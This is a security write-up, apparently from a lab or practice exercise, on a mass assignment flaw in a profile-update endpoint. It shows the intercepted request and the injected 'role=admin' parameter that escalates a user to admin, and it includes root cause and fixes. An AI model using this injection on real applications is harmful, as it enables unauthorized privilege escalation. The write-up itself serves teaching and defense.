# Mass Assignment Vulnerability – Privilege Escalation

## 📌 Summary
A **Mass Assignment** vulnerability was identified in the user profile update functionality.  
This issue allows a normal authenticated user to escalate privileges to **admin** by injecting additional parameters into the HTTP request.

---

## 🎯 Impact
- Privilege Escalation (User → Admin)
- Unauthorized access to `/admin` panel
- Ability to perform administrative actions (e.g. deleting other users)

**Severity:** High  
**OWASP Top 10:** A5 – Security Misconfiguration / Mass Assignment

---

## 🧩 Affected Endpoint
POST /user/profile

---

## 🔍 Vulnerability Details
The backend application accepts user input from the profile update form and maps it directly to the user model without enforcing an explicit allowlist of permitted fields.

As a result, attackers can add sensitive attributes (such as `role`) to the request body.

---

## 📥 Normal Request (Captured via Burp Suite)

```http
POST /user/profile HTTP/1.1  
Host: localhost:3000  
Content-Type: application/x-www-form-urlencoded  
Cookie: token=<JWT_TOKEN>

firstName=shahab&lastName=epic&bio=I+am+a+web+application+penetration+tester.
```
---

## 💥 Exploitation

The request was intercepted using **Burp Suite Repeater** and an additional parameter was injected:
```http
firstName=shahab&lastName=epic&bio=I+am+a+web+application+penetration+tester.&role=admin
```
After sending the modified request, the server accepted the unexpected `role` parameter and updated the user's role in the database.

---

## 🚨 Proof of Exploitation

### Before Exploitation
Accessing the admin panel was not allowed:

GET /admin  
❌ Access denied

### After Exploitation

GET /admin HTTP/1.1  
✅ 200 OK

✅ Admin panel loaded successfully  
The user gained full administrative privileges and could perform actions such as deleting other users.

---

## 🛡️ Root Cause
- No server-side validation of allowed fields  
- User-controlled input mapped directly to the database model  
- Missing attribute allowlist during update

---

## ✅ Recommended Fix
- Implement explicit allowlisting of updatable fields  
- Reject unexpected parameters  
- Enforce role changes server-side only  

---

## 📚 Learning Outcome
This vulnerability demonstrates how improper input handling can lead to full privilege escalation through Mass Assignment.
